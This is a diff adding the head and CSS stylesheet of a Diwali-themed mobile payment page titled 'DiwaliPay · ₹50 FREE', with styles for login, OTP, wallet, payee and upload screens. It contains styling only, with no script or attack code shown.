@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#d97706">
+<title>DiwaliPay · ₹50 FREE</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&family=Baloo+2:wght@500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+:root{
+  --th1:#fbbf24;--th2:#d97706;--th3:#b45309;--th4:#7c2d12;--thGlow:rgba(245,158,11,.5);
+  --thBg1:#fff9ec;--thBg2:#fef3c7;--thBg3:#fed7aa;
+  --g1:#22c55e;--g2:#16a34a;--g3:#0b6b3a;--gGlow:rgba(34,197,94,.5);
+  --b1:#3b82f6;--b2:#1d4ed8;--b3:#0c2d6b;--bGlow:rgba(59,130,246,.5);
+  --purple:#8b5cf6;--purpleDeep:#4c1d95;--purpleGlow:rgba(139,92,246,.45);
+  --red:#ef4444;--redDeep:#7f1d1d;--redGlow:rgba(239,68,68,.45);
+  --ink:#0a2e1c;--muted:#5c7a68;
+  --toon:'Fredoka','Baloo 2','Trebuchet MS',sans-serif;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{margin:0;padding:0;overflow-x:hidden;}
+body{font-family:var(--toon);font-weight:500;color:var(--ink);min-height:100vh;display:flex;justify-content:center;background:radial-gradient(circle at 12% 8%,var(--thGlow),transparent 45%),linear-gradient(135deg,var(--thBg1),var(--thBg3));}
+.hidden{display:none!important;}
+.phone{width:100%;max-width:430px;min-height:100vh;background:linear-gradient(180deg,var(--thBg1) 0%,var(--thBg2) 40%,var(--thBg3) 100%);position:relative;overflow-x:hidden;box-shadow:0 0 80px var(--thGlow);}
+
+@keyframes pop{0%{transform:scale(.85)}100%{transform:scale(1)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes floaty{0%,100%{transform:translateY(0)}50%{transform:translateY(-4px)}}
+@keyframes softPulse{0%,100%{opacity:.55}50%{opacity:.85}}
+@keyframes flipUpdate{0%{transform:scale(1)}50%{transform:scale(1.12)}100%{transform:scale(1)}}
+@keyframes floatUp{0%{transform:translateY(105vh) scale(.6);opacity:0}20%{opacity:.6}100%{transform:translateY(-15vh) scale(1.2);opacity:0}}
+@keyframes payBounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-4px)}}
+@keyframes orbitRing{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+@keyframes orbitRing2{0%{transform:rotate(360deg)}100%{transform:rotate(0)}}
+@keyframes dotBounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+@keyframes diyaFlame{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+@keyframes fireworkBurst{0%{transform:scale(0);opacity:1}30%{transform:scale(1);opacity:1}60%{transform:scale(1.4);opacity:.5}100%{transform:scale(2);opacity:0}}
+@keyframes rgbSlide{0%{background-position:0% 0%}100%{background-position:0% 400%}}
+@keyframes textShine{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+
+.bg-fx{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
+.bg-fx span{position:absolute;width:8px;height:8px;border-radius:50%;background:radial-gradient(circle,var(--th1),transparent 70%);opacity:.7;animation:floatUp linear infinite;}
+.bg-fx span:nth-child(1){left:10%;animation-duration:11s;}
+.bg-fx span:nth-child(2){left:25%;animation-duration:14s;animation-delay:2s;}
+.bg-fx span:nth-child(3){left:42%;animation-duration:9s;animation-delay:1s;}
+.bg-fx span:nth-child(4){left:58%;animation-duration:13s;animation-delay:3s;}
+.bg-fx span:nth-child(5){left:72%;animation-duration:10s;animation-delay:.5s;}
+.bg-fx span:nth-child(6){left:88%;animation-duration:15s;animation-delay:2.5s;}
+
+#loginScreen,#registerScreen,#forgotScreen,#newPassScreen,#waitScreen,#loginOtpScreen{display:flex;flex-direction:column;justify-content:center;min-height:100vh;padding:26px 18px 34px;background:linear-gradient(180deg,var(--thBg1),var(--thBg3));position:relative;z-index:2;}
+.reg-logo{width:104px;height:104px;border-radius:34px;margin:0 auto 16px;background:linear-gradient(160deg,var(--th1),var(--th2) 40%,var(--th3));display:flex;align-items:center;justify-content:center;font-size:48px;color:#fff;position:relative;overflow:hidden;box-shadow:0 12px 0 var(--th4),0 18px 32px var(--thGlow),inset 0 4px 0 rgba(255,255,255,.5);animation:floaty 4s ease-in-out infinite;z-index:1;}
+.reg-logo img{width:100%;height:100%;object-fit:cover;border-radius:30px;display:block;}
+.reg-title{font-size:30px;text-align:center;margin:0 0 6px;color:var(--th4);font-weight:800;letter-spacing:-.4px;text-shadow:0 3px 0 rgba(255,255,255,.95);position:relative;z-index:1;}
+.reg-title .acc{background:linear-gradient(120deg,var(--th1),var(--th3),var(--th2));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+.reg-sub{text-align:center;color:var(--th4);font-size:14px;margin:0 0 18px;font-weight:600;position:relative;z-index:1;opacity:.85;}
+
+.field{display:flex;align-items:center;gap:10px;background:#fff;border:2.5px solid var(--th1);border-radius:18px;padding:0 15px;height:58px;margin-bottom:12px;position:relative;z-index:1;box-shadow:0 5px 0 var(--th1),inset 0 2px 0 rgba(255,255,255,.95);transition:.2s;}
+.field:focus-within{border-color:var(--th2);box-shadow:0 5px 0 var(--th3),0 0 0 4px var(--thGlow);}
+.field i{color:var(--th3);font-size:17px;width:22px;text-align:center;flex:0 0 auto;}
+.field input{border:0;outline:0;flex:1;font-size:16px;background:transparent;color:var(--ink);font-family:var(--toon);font-weight:600;min-width:0;}
+.field input::placeholder{color:#c9a878;font-weight:500;}
+
+.otp-row{display:flex;gap:9px;align-items:stretch;margin-bottom:12px;position:relative;z-index:1;}
+.otp-row .field{flex:1;margin-bottom:0;}
+.btn-otp{min-width:100px;padding:0 16px;border:0;border-radius:18px;background:linear-gradient(180deg,var(--th1),var(--th2) 50%,var(--th3));color:#fff;font-size:13px;cursor:pointer;font-family:var(--toon);font-weight:700;text-shadow:0 2px 0 rgba(0,0,0,.2);box-shadow:0 6px 0 var(--th4),0 8px 18px var(--thGlow);transition:.1s;position:relative;overflow:hidden;}
+.btn-otp:active{transform:translateY(4px);box-shadow:0 2px 0 var(--th4);}
+.btn-otp:disabled{opacity:.6;cursor:not-allowed;}
+.otp-hint{font-size:13px;font-weight:700;margin:-4px 0 12px 5px;min-height:15px;position:relative;z-index:1;color:var(--th3);}
+.otp-hint.sent{background:rgba(251,191,36,.15);border:2px dashed var(--th1);border-radius:14px;padding:12px;color:var(--th4);text-align:center;display:flex;align-items:center;justify-content:center;gap:8px;}
+
+.btn-primary{width:100%;height:60px;border:0;border-radius:22px;background:linear-gradient(180deg,var(--th1),var(--th2) 50%,var(--th3));color:#fff;font-size:17px;cursor:pointer;position:relative;z-index:1;display:flex;align-items:center;justify-content:center;gap:10px;text-shadow:0 2px 0 rgba(0,0,0,.2);box-shadow:0 7px 0 var(--th4),0 14px 26px var(--thGlow),inset 0 3px 0 rgba(255,255,255,.5);transition:.08s;margin-top:8px;font-family:var(--toon);font-weight:700;}
+.btn-primary:active{transform:translateY(6px);box-shadow:0 1px 0 var(--th4);}
+.btn-primary.green{background:linear-gradient(180deg,#4ade80,#22c55e 50%,#16a34a);box-shadow:0 7px 0 var(--g3),0 14px 26px var(--gGlow),inset 0 3px 0 rgba(255,255,255,.4);}
+
+.forgot-link{display:block;text-align:center;margin-top:14px;color:var(--th3);font-weight:700;font-size:14.5px;cursor:pointer;padding:8px;position:relative;z-index:1;}
+.tiny-note{text-align:center;font-size:12.5px;color:var(--th3);margin:16px 0 0;font-weight:600;position:relative;z-index:1;opacity:.8;}
+.tiny-note .link{color:var(--th4);font-weight:800;cursor:pointer;text-decoration:underline;}
+
+.otp-orb{width:120px;height:120px;margin:0 auto 22px;border-radius:50%;background:linear-gradient(160deg,var(--th1),var(--th2) 40%,var(--th3));display:flex;align-items:center;justify-content:center;font-size:50px;color:#fff;position:relative;box-shadow:0 12px 0 var(--th4),0 18px 32px var(--thGlow),inset 0 4px 0 rgba(255,255,255,.45);animation:payBounce 3s ease-in-out infinite;}
+.otp-title{font-size:28px;font-weight:800;color:var(--th4);margin:0 0 8px;text-align:center;}
+.otp-desc{text-align:center;font-size:14.5px;color:var(--th3);margin:0 0 22px;font-weight:600;line-height:1.55;}
+.otp-desc b{color:var(--th4);letter-spacing:1.5px;font-size:16px;}
+.otp-box{width:100%;height:70px;border:3px solid var(--th1);border-radius:22px;background:#fff;font-size:32px;font-weight:700;color:var(--th4);text-align:center;letter-spacing:14px;padding-left:14px;outline:none;transition:all .2s;margin-bottom:14px;box-shadow:0 5px 0 var(--th1);font-family:'Courier New',monospace;}
+
+.wait-orb-wrap{position:relative;width:170px;height:170px;margin:0 auto 26px;display:flex;align-items:center;justify-content:center;}
+.wait-ring{position:absolute;inset:0;border-radius:50%;border:3px solid var(--th1);animation:softPulse 3s ease-out infinite;}
+.wait-ring.delay1{animation-delay:1s;}
+.wait-ring.delay2{animation-delay:2s;}
+.wait-orb{width:120px;height:120px;border-radius:50%;background:linear-gradient(160deg,var(--th1),var(--th2) 40%,var(--th3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:52px;position:relative;z-index:2;animation:payBounce 3s ease-in-out infinite;box-shadow:0 12px 0 var(--th4);}
+.wait-title{font-size:26px;font-weight:800;color:var(--th4);margin:0 0 10px;text-align:center;}
+.wait-sub{font-size:14px;color:var(--th3);font-weight:600;margin:0 0 22px;line-height:1.55;max-width:340px;text-align:center;align-self:center;}
+.wait-card{width:100%;max-width:350px;background:#fff;border:2.5px solid var(--th1);border-radius:24px;padding:18px 20px;margin:0 auto 18px;text-align:left;}
+.wait-row{display:flex;align-items:center;gap:12px;padding:10px 0;}
+.wait-row+.wait-row{border-top:2px dashed var(--th1);}
+.wait-row i{width:42px;height:42px;border-radius:14px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:15px;color:var(--th3);background:rgba(251,191,36,.15);border:2px solid var(--th1);}
+.wait-row .lbl-s{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.9px;text-transform:uppercase;}
+.wait-row .val-s{font-size:15.5px;font-weight:700;color:var(--ink);margin-top:2px;}
+.wait-row .val-s.mono{letter-spacing:2px;color:var(--th3);font-family:'Courier New',monospace;}
+.wait-status-badge{display:inline-flex;align-items:center;gap:10px;padding:14px 22px;border-radius:28px;background:var(--thBg2);border:2px solid var(--th1);color:var(--th4);font-weight:700;font-size:14px;margin-bottom:16px;align-self:center;}
+.wait-status-badge i{animation:spin 2s linear infinite;display:inline-block;}
+
+.app-header{position:sticky;top:0;z-index:20;background:linear-gradient(180deg,var(--th2),var(--th3));padding:16px 18px 20px;border-radius:0 0 26px 26px;box-shadow:0 8px 0 var(--th4);}
+.header-top{display:flex;align-items:center;gap:12px;}
+.h-avatar{width:46px;height:46px;border-radius:16px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.95);color:var(--th3);font-size:19px;box-shadow:0 4px 0 rgba(0,0,0,.2);overflow:hidden;}
+.h-avatar img{width:100%;height:100%;object-fit:cover;border-radius:13px;}
+.h-hi{font-size:12px;color:rgba(255,255,255,.85);font-weight:600;}
+.h-name{font-size:17px;color:#fff;font-weight:800;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.h-badge{margin-left:auto;display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.95);color:var(--th3);font-weight:800;font-size:15px;padding:9px 14px;border-radius:16px;box-shadow:0 4px 0 rgba(0,0,0,.2);}
+.app-main{padding:18px 16px 30px;position:relative;z-index:1;}
+
+.main-diwali-banner{position:relative;overflow:visible;border-radius:24px;margin-bottom:18px;z-index:1;background:linear-gradient(135deg,#1a0a2e 0%,#4a044e 40%,#7c2d12 100%);border:3px solid var(--th1);box-shadow:0 10px 0 var(--th4);display:flex;flex-direction:column;min-height:180px;padding:0 4px;}
+.main-diwali-banner .rgb-light{position:absolute;top:6%;height:88%;width:10px;border-radius:10px;background:linear-gradient(180deg,#ff0080,#ff8c00,#ffee00,#00ff88,#00bfff,#8a2be2,#ff0080);background-size:100% 400%;animation:rgbSlide 3s linear infinite;z-index:0;pointer-events:none;}
+.main-diwali-banner .rgb-light.left{left:-16px;}
+.main-diwali-banner .rgb-light.right{right:-16px;}
+.banner-img-wrap{width:100%;height:180px;overflow:hidden;line-height:0;flex:0 0 auto;background:#0a0a1a;display:flex;align-items:center;justify-content:center;border-radius:21px 21px 0 0;}
+.banner-img-wrap img{width:100%;height:100%;object-fit:cover;display:block;border-radius:21px 21px 0 0;}
+.banner-text-top{position:relative;z-index:5;padding:14px 18px 6px;text-align:center;color:#fff;flex:0 0 auto;}
+.banner-text-top .bt-small{font-size:12px;letter-spacing:3px;text-transform:uppercase;font-weight:800;color:#fde68a;margin-bottom:4px;}
+.banner-text-top .bt-big{font-size:32px;font-weight:900;line-height:1.1;background:linear-gradient(90deg,#fbbf24,#ef4444,#3b82f6,#22c55e,#fbbf24);background-size:300% 100%;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;animation:textShine 4s linear infinite;}
+.banner-text-top .bt-date{font-size:13px;color:#fef3c7;font-weight:700;margin-top:4px;}
+.banner-anim{padding:0 0 14px;text-align:center;font-size:42px;position:relative;z-index:5;line-height:1;flex:0 0 auto;}
+.banner-anim .diya-row{display:flex;align-items:flex-end;justify-content:center;gap:14px;}
+.banner-anim .diya-row span{animation:diyaFlame 1.6s ease-in-out infinite;display:inline-block;}
+.diya-lamp{position:absolute;font-size:36px;line-height:1;animation:floaty 2.5s ease-in-out infinite;z-index:6;pointer-events:none;}
+.diya-lamp.l1{left:14px;bottom:14px;}
+.diya-lamp.l2{right:14px;bottom:14px;}
+.diya-lamp.l3{left:50%;bottom:8px;margin-left:-18px;font-size:30px;}
+.firework{position:absolute;width:14px;height:14px;border-radius:50%;animation:fireworkBurst 2.2s ease-out infinite;pointer-events:none;z-index:3;}
+.firework.f1{left:22%;top:32%;background:#ef4444;}
+.firework.f2{right:22%;top:28%;background:#3b82f6;animation-delay:.5s;}
+.firework.f3{left:16%;top:60%;background:#22c55e;animation-delay:1s;}
+.firework.f4{right:18%;top:58%;background:#8b5cf6;animation-delay:1.5s;}
+.firework.f5{left:50%;top:20%;margin-left:-7px;background:#f59e0b;animation-delay:.8s;}
+.firework.f6{right:38%;top:68%;background:#ec4899;animation-delay:1.2s;}
+
+.balance-card{margin-bottom:16px;position:relative;z-index:1;}
+.balance-body{background:linear-gradient(135deg,var(--th3),var(--th4));border-radius:26px;padding:20px;display:flex;align-items:center;gap:16px;box-shadow:0 9px 0 rgba(0,0,0,.25);position:relative;overflow:hidden;}
+.bc-coin{width:60px;height:60px;border-radius:20px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.95);color:var(--th3);font-size:26px;box-shadow:0 5px 0 rgba(0,0,0,.2);}
+.bc-info{flex:1;min-width:0;}
+.bc-label{font-size:12px;color:rgba(255,255,255,.8);font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.bc-amount{font-size:34px;color:#fff;font-weight:800;line-height:1.1;}
+.bc-amount.updated{animation:flipUpdate .5s ease;}
+.bc-foot{font-size:12.5px;color:rgba(255,255,255,.9);font-weight:600;margin-top:4px;display:flex;align-items:center;gap:6px;}
+
+.bonus-card{display:flex;align-items:center;gap:14px;background:#fff;border:2.5px solid var(--th1);border-radius:22px;padding:15px 17px;margin-bottom:16px;box-shadow:0 6px 0 var(--th1);position:relative;z-index:1;}
+.icon-circle{width:48px;height:48px;border-radius:16px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,var(--th1),var(--th3));color:#fff;font-size:20px;}
+.bc-title{font-size:15px;font-weight:800;color:var(--th4);}
+.bc-sub{font-size:12.5px;color:var(--muted);font-weight:600;margin-top:2px;}
+.bonus-card .ok{margin-left:auto;color:#22c55e;font-size:22px;}
+
+.verified-wallets-card{background:#fff;border:2.5px solid var(--th1);border-radius:22px;padding:15px 17px;margin-bottom:16px;box-shadow:0 6px 0 var(--th1);position:relative;z-index:1;}
+.vwc-head{display:flex;align-items:center;gap:12px;margin-bottom:12px;}
+.vwc-icon{width:44px;height:44px;border-radius:14px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#4ade80,#16a34a);color:#fff;font-size:18px;}
+.vwc-title{font-size:15px;font-weight:800;color:var(--th4);}
+.vwc-sub{font-size:12px;color:var(--muted);font-weight:600;margin-top:2px;}
+.vwc-count{margin-left:auto;display:flex;align-items:center;gap:5px;background:rgba(34,197,94,.14);color:#16a34a;font-weight:800;font-size:13px;padding:7px 12px;border-radius:14px;}
+.vwc-grid{display:flex;flex-wrap:wrap;gap:8px;}
+.vwc-pill{display:flex;align-items:center;gap:8px;background:#f0fdf4;border:2px solid #bbf7d0;border-radius:16px;padding:7px 12px 7px 7px;font-size:13.5px;font-weight:700;color:#14532d;}
+.wp-ico{width:28px;height:28px;border-radius:9px;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,var(--th1),var(--th3));color:#fff;font-size:13px;overflow:hidden;}
+.wp-ico img{width:100%;height:100%;object-fit:cover;}
+.wp-check{color:#22c55e;font-size:13px;}
+
+.btn-row{display:flex;gap:10px;margin-bottom:16px;position:relative;z-index:1;}
+.row-btn{flex:1;height:74px;border:0;border-radius:20px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;color:#fff;font-family:var(--toon);font-weight:700;font-size:11.5px;letter-spacing:.6px;cursor:pointer;transition:.08s;}
+.row-btn i{font-size:20px;}
+.row-btn:active{transform:translateY(4px);}
+.row-btn.green{background:linear-gradient(180deg,#4ade80,#16a34a);box-shadow:0 6px 0 var(--g3);}
+.row-btn.amber{background:linear-gradient(180deg,var(--th1),var(--th3));box-shadow:0 6px 0 var(--th4);}
+.row-btn.purple{background:linear-gradient(180deg,#a78bfa,#7c3aed);box-shadow:0 6px 0 #4c1d95;}
+.row-btn.blue{background:linear-gradient(180deg,#60a5fa,#1d4ed8);box-shadow:0 6px 0 var(--b3);}
+
+.btn-logout{width:100%;height:56px;border:0;border-radius:20px;background:linear-gradient(180deg,#f87171,#dc2626);color:#fff;font-family:var(--toon);font-weight:700;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 0 #7f1d1d;position:relative;z-index:1;}
+.btn-logout:active{transform:translateY(4px);box-shadow:0 2px 0 #7f1d1d;}
+
+.tiny-footer{text-align:center;margin-top:22px;font-size:12.5px;color:var(--th3);font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;opacity:.8;}
+
+.overlay{position:fixed;inset:0;background:rgba(10,20,15,.55);backdrop-filter:blur(4px);z-index:100;display:none;align-items:flex-end;justify-content:center;}
+.overlay.show{display:flex;animation:pop .25s ease;}
+.sheet{width:100%;max-width:430px;max-height:90vh;overflow-y:auto;background:#fff;border-radius:28px 28px 0 0;padding:16px 18px 26px;box-shadow:0 -10px 40px rgba(0,0,0,.25);position:relative;}
+.sheet-handle{width:44px;height:5px;border-radius:3px;background:#e2e8f0;margin:0 auto 14px;}
+.sheet-icon{width:64px;height:64px;border-radius:22px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:26px;color:#fff;}
+.sheet-icon.green{background:linear-gradient(160deg,#4ade80,#16a34a);box-shadow:0 6px 0 var(--g3);}
+.sheet-icon.blue{background:linear-gradient(160deg,#60a5fa,#1d4ed8);box-shadow:0 6px 0 var(--b3);}
+.sheet-icon.purple{background:linear-gradient(160deg,#a78bfa,#7c3aed);box-shadow:0 6px 0 var(--purpleDeep);}
+.sheet-icon.red{background:linear-gradient(160deg,#f87171,#dc2626);box-shadow:0 6px 0 var(--redDeep);}
+.sheet h3{text-align:center;margin:0 0 6px;font-size:22px;color:var(--th4);font-weight:800;}
+.sheet-sub{text-align:center;font-size:13.5px;color:var(--muted);font-weight:600;margin:0 0 16px;}
+.sheet-head{display:flex;align-items:center;gap:12px;margin-bottom:16px;}
+.sheet-head .sheet-icon{width:48px;height:48px;font-size:20px;border-radius:16px;margin:0;}
+.sheet-title{font-size:18px;font-weight:800;color:var(--th4);}
+.close-x{width:38px;height:38px;border:0;border-radius:12px;background:#f1f5f9;color:#64748b;font-size:17px;cursor:pointer;flex:0 0 auto;}
+
+.btn-ghost{width:100%;height:52px;border-radius:18px;margin-top:12px;border:2.5px solid var(--th1);background:#fff;color:var(--th3);font-family:var(--toon);font-weight:700;font-size:15px;cursor:pointer;box-shadow:0 5px 0 var(--th1);}
+
+.field2{display:flex;align-items:center;gap:10px;background:#fff;border:2.5px solid var(--th1);border-radius:18px;padding:0 15px;height:56px;margin-bottom:12px;box-shadow:0 5px 0 var(--th1);}
+.field2 i{color:var(--th3);font-size:17px;width:22px;text-align:center;}
+.field2 input{border:0;outline:0;flex:1;font-size:16px;background:transparent;color:var(--ink);font-family:var(--toon);font-weight:600;min-width:0;}
+
+.lbl{display:block;font-size:12.5px;font-weight:800;color:var(--th4);letter-spacing:.6px;text-transform:uppercase;margin:0 0 8px 4px;}
+.hint{font-size:13px;font-weight:700;margin:-4px 0 12px 5px;color:var(--th3);}
+.hint.sent{background:rgba(251,191,36,.15);border:2px dashed var(--th1);border-radius:14px;padding:12px;color:var(--th4);text-align:center;}
+
+.wallet-card{display:flex;align-items:center;gap:12px;background:#f8fafc;border:2px solid #e2e8f0;border-radius:18px;padding:13px;margin-bottom:10px;cursor:pointer;}
+.wallet-card.verified{background:#f0fdf4;border-color:#bbf7d0;}
+.wallet-card.pending-card{background:#fffbeb;border-color:#fde68a;}
+.wc-icon{width:48px;height:48px;border-radius:15px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,var(--th1),var(--th3));color:#fff;font-size:20px;overflow:hidden;}
+.wc-icon img{width:100%;height:100%;object-fit:cover;}
+.wc-info{flex:1;min-width:0;}
+.wc-name{font-size:15px;font-weight:800;color:var(--ink);}
+.wc-status{font-size:11.5px;font-weight:700;margin-top:3px;display:flex;align-items:center;gap:6px;color:#64748b;}
+.wc-status .dot{width:7px;height:7px;border-radius:50%;background:#94a3b8;display:inline-block;}
+.wc-status.ok{color:#16a34a;}.wc-status.ok .dot{background:#22c55e;}
+.wc-status.pending{color:#d97706;}.wc-status.pending .dot{background:#f59e0b;}
+.btn-verify{min-width:88px;height:40px;border:0;border-radius:14px;background:linear-gradient(180deg,var(--th1),var(--th3));color:#fff;font-family:var(--toon);font-weight:700;font-size:13px;cursor:pointer;box-shadow:0 4px 0 var(--th4);}
+.btn-verify.verified{background:linear-gradient(180deg,#4ade80,#16a34a);box-shadow:0 4px 0 var(--g3);}
+.btn-verify.pending{background:linear-gradient(180deg,#fcd34d,#f59e0b);box-shadow:0 4px 0 #b45309;}
+
+.spinner{width:56px;height:56px;border-radius:50%;border:5px solid #e2e8f0;border-top-color:var(--th2);margin:0 auto 14px;animation:spin 1s linear infinite;}
+.loading-text{text-align:center;font-size:15px;font-weight:700;color:var(--th3);}
+.result-box{text-align:center;padding:24px 18px;border-radius:22px;font-weight:800;font-size:17px;}
+.result-box i{display:block;font-size:52px;margin-bottom:12px;}
+.result-box span{display:block;font-size:13px;font-weight:600;margin-top:8px;opacity:.85;}
+.result-box.green{background:#f0fdf4;border:3px solid #86efac;color:#14532d;}
+.result-box.blue{background:#eff6ff;border:3px solid #93c5fd;color:#1e3a8a;}
+.result-box.red{background:#fef2f2;border:3px solid #fca5a5;color:#7f1d1d;}
+
+.payee-card{background:#fff;border:2.5px solid var(--th1);border-radius:22px;padding:14px 16px;margin-bottom:14px;position:relative;box-shadow:0 6px 0 var(--th1);}
+.payee-status{position:absolute;top:-12px;right:16px;display:flex;align-items:center;gap:6px;font-size:10.5px;font-weight:800;letter-spacing:1px;padding:6px 12px;border-radius:14px;}
+.payee-status.offline{background:#fef2f2;color:#b91c1c;border:2px solid #fca5a5;}
+.payee-status.live{background:#f0fdf4;color:#15803d;border:2px solid #86efac;}
+.payee-row{display:flex;align-items:center;gap:10px;padding:11px 0;border-bottom:1.5px dashed #fde68a;}
+.payee-row:last-child{border-bottom:0;}
+.payee-lbl{font-size:11.5px;font-weight:800;color:var(--muted);letter-spacing:.8px;text-transform:uppercase;width:64px;flex:0 0 auto;}
+.payee-val{flex:1;font-size:15.5px;font-weight:800;color:var(--th4);word-break:break-all;}
+.payee-val.mono{font-family:'Courier New',monospace;letter-spacing:1px;}
+.payee-row.amount .payee-val{font-size:24px;color:#16a34a;}
+.payee-copy{border:0;background:#fef3c7;color:var(--th3);font-family:var(--toon);font-weight:700;font-size:11px;padding:8px 11px;border-radius:12px;cursor:pointer;display:flex;align-items:center;gap:5px;flex:0 0 auto;}
+
+.upload-box{position:relative;border:3px dashed var(--th1);border-radius:22px;background:#fffdf5;min-height:150px;display:flex;align-items:center;justify-content:center;cursor:pointer;overflow:hidden;margin-bottom:14px;padding:18px;}
+.upload-inner{text-align:center;color:var(--th3);}
+.upload-inner i{font-size:40px;display:block;margin-bottom:10px;}
+.upload-title{font-size:16px;font-weight:800;color:var(--th4);}
+.upload-hint{font-size:12.5px;font-weight:600;margin-top:4px;opacity:.8;}
+.upload-box img{width:100%;max-height:260px;object-fit:contain;border-radius:16px;}
+.upload-change{position:absolute;bottom:12px;right:12px;background:rgba(0,0,0,.65);color:#fff;font-size:12px;font-weight:700;padding:8px 13px;border-radius:14px;display:flex;align-items:center;gap:6px;}
+.upload-box.has-image{border-style:solid;padding:8px;}
+
+.unlock-wait{text-align:center;padding:10px 0 6px;}
+.uw-orb{width:100px;height:100px;border-radius:50%;margin:0 auto 16px;background:linear-gradient(160deg,var(--th1),var(--th3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:42px;box-shadow:0 10px 0 var(--th4);animation:payBounce 3s ease-in-out infinite;}
+.uw-tt{font-size:20px;font-weight:800;color:var(--th4);margin-bottom:10px;}
+.uw-desc{font-size:13.5px;color:var(--th3);font-weight:600;line-height:1.6;margin:0 0 16px;}
+.verify-dots{display:flex;justify-content:center;gap:8px;margin-bottom:16px;}
+.verify-dots span{width:11px;height:11px;border-radius:50%;background:var(--th1);animation:dotBounce 1.1s ease-in-out infinite;}
+.verify-dots span:nth-child(2){animation-delay:.15s;}
+.verify-dots span:nth-child(3){animation-delay:.3s;}
+.pay-status-row{display:flex;align-items:center;justify-content:center;gap:9px;background:var(--thBg2);border:2px solid var(--th1);border-radius:16px;padding:13px 16px;font-size:13.5px;font-weight:700;color:var(--th4);}
+.pay-status-row i{animation:spin 1.6s linear infinite;}
+
+.pay-verify-anim{margin-bottom:6px;}
+.pay-orbit{position:relative;width:140px;height:140px;margin:10px auto 14px;display:flex;align-items:center;justify-content:center;}
+.pay-orbit-ring{position:absolute;inset:0;border-radius:50%;border:3px solid transparent;border-top-color:var(--th2);border-right-color:var(--th1);animation:orbitRing 1.6s linear infinite;}
+.pay-orbit-ring.delay1{inset:12px;border-top-color:var(--th1);border-right-color:transparent;border-left-color:var(--th2);animation:orbitRing2 2s linear infinite;}
+.pay-orbit-ring.delay2{inset:24px;border-top-color:transparent;border-right-color:var(--th2);border-bottom-color:var(--th1);animation:orbitRing 2.4s linear infinite;}
+.pay-orbit-icon{width:66px;height:66px;border-radius:50%;background:linear-gradient(160deg,var(--th1),var(--th3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;box-shadow:0 8px 0 var(--th4);}
+.pay-timer{text-align:center;font-family:'Courier New',monospace;font-size:36px;font-weight:800;color:var(--th4);letter-spacing:3px;}
+.pay-timer-label{text-align:center;font-size:15px;font-weight:800;color:var(--th3);margin-top:4px;}
+.pay-timer-sub{text-align:center;font-size:12.5px;color:var(--muted);font-weight:600;margin:6px 0 16px;}
+
+.wallet-req-popup{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%) scale(.85);width:calc(100% - 44px);max-width:360px;background:#fff;border-radius:26px;padding:24px 20px;box-shadow:0 20px 60px rgba(0,0,0,.3);z-index:200;text-align:center;opacity:0;pointer-events:none;transition:.25s;}
+.wallet-req-popup.show{opacity:1;pointer-events:auto;transform:translate(-50%,-50%) scale(1);}
+.wallet-req-icon{width:70px;height:70px;border-radius:24px;margin:0 auto 14px;background:linear-gradient(160deg,var(--th1),var(--th3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;box-shadow:0 8px 0 var(--th4);}
+.wallet-req-title{margin:0 0 8px;font-size:20px;color:var(--th4);font-weight:800;}
+.wallet-req-text{font-size:13.5px;color:var(--muted);font-weight:600;line-height:1.55;margin:0 0 16px;}
+.wallet-req-info{background:var(--thBg1);border:2px dashed var(--th1);border-radius:16px;padding:12px 14px;text-align:left;margin-bottom:16px;}
+.wallet-req-info div{display:flex;align-items:center;gap:8px;font-size:13.5px;font-weight:700;color:var(--th4);padding:5px 0;}
+.wallet-req-info i{color:var(--th3);width:18px;text-align:center;}
+.wallet-req-info .m{color:var(--muted);font-weight:600;min-width:56px;}
+.wallet-req-btn{width:100%;height:54px;border:0;border-radius:18px;background:linear-gradient(180deg,#4ade80,#16a34a);color:#fff;font-family:var(--toon);font-weight:800;font-size:15px;cursor:pointer;box-shadow:0 6px 0 var(--g3);}
+
